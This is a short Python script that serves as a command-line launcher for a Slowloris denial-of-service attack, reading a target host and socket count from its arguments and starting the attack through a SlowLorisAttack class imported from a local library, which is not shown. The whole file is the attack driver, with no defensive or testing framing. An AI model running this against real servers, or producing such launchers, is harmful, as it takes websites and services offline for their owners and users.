#!/usr/bin/env python3

import rich, sys
from lib import HostAddress, SlowLorisAttack
from lib import logo

try:
  url = HostAddress.from_url(f"http://{sys.argv[1]}")
  sockets_c = int(sys.argv[2])


  dd_attack = SlowLorisAttack(url, sockets_c, silent=True)


  dd_attack.start()

except KeyboardInterrupt:
    print (" Mas já?? :( ")
    exit(0)
